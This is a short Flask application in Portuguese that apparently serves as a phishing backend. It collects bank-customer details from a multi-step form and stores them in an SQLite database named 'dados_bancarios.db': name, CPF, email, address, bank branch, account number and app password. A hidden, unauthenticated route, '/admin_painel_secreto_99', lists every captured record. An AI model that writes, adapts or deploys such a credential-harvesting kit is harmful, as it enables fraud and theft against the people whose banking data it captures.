import os
import sqlite3
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    # Cria a tabela com todas as colunas necessárias para os 5 passos
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usuarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT, cpf TEXT, email TEXT,
            cep TEXT, rua TEXT,
            agencia TEXT, conta TEXT, senha_app TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    nome = request.form.get('nome')
    cpf = request.form.get('cpf')
    email = request.form.get('email')
    cep = request.form.get('cep')
    rua = request.form.get('rua')
    agencia = request.form.get('agencia')
    conta = request.form.get('conta')
    senha_app = request.form.get('senha_app')

    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO usuarios (nome, cpf, email, cep, rua, agencia, conta, senha_app)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (nome, cpf, email, cep, rua, agencia, conta, senha_app))
    conn.commit()
    conn.close()
    
    # Redireciona para a nova página de sucesso
    return redirect('/sucesso')

@app.route('/sucesso')
def sucesso():
    return render_template('sucesso.html')

@app.route('/admin_painel_secreto_99')
def admin():
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM usuarios ORDER BY id DESC')
    usuarios = cursor.fetchall()
    conn.close()
    return render_template('admin.html', usuarios=usuarios)

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
